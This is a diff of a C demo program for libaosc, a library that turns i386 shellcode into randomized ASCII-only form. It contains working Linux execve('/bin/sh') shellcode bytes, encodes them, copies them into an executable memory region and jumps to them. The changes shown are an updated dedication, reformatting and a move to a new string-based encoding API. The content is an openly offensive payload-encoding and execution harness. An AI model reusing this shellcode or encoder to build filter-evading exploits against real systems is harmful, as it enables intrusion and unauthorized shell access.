@@ -1,6 +1,6 @@
 /* libaosc, an encoding library for randomized i386 ASCII-only shellcode.
  *
- * Dedicated to Merle Planten.
+ * Dedicated to Kanna Ishihara.
  *
  * Copyright (C) 2001-2008 Ronald Huizer
  *
@@ -30,14 +30,15 @@
 #define MAX_NOPS 1000
 
 unsigned char shellcode[]=
-"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+	"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
 
 int main(void)
 {
 	unsigned char *ret_addy;
-	shellcode_t code, ascii_cruft;
+	struct string ascii_code;
+	shellcode_t code;
 	unsigned int foo, bar, numnops;
 
 	ret_addy = mmap(NULL, 31337, PROT_READ | PROT_WRITE | PROT_EXEC,
@@ -55,20 +56,19 @@ int main(void)
 	code.shellcode = shellcode;
 	code.size = sizeof(shellcode) - 1;
 
-	/*
-	 * aos_encode() the shellcode code, with a return address of
+	/* aos_encode() the shellcode code, with a return address of
 	 * 'ret_addy' and use NUMNOPS nops
 	 */
-	ascii_cruft = aos_encode_safe(code, ret_addy + foo, numnops);
+	aos_encode(&ascii_code, code, ret_addy + foo, numnops);
 
 	printf("Executing shellcode:\n\n");
-	printf("%s\n", ascii_cruft.shellcode);
+	string_print(&ascii_code);
 	printf("\nReturn address: %p - Encoded return address: %p\n",
 					 ret_addy + bar, ret_addy + foo);
 	fflush(stdout);
 
-	memcpy((void *)ret_addy, ascii_cruft.shellcode, ascii_cruft.size);
-	free(ascii_cruft.shellcode);
+	memcpy(ret_addy, string_get_data(&ascii_code), string_get_length(&ascii_code));
+	string_destroy(&ascii_code);
 
 	((void(*)())ret_addy + bar)();
 
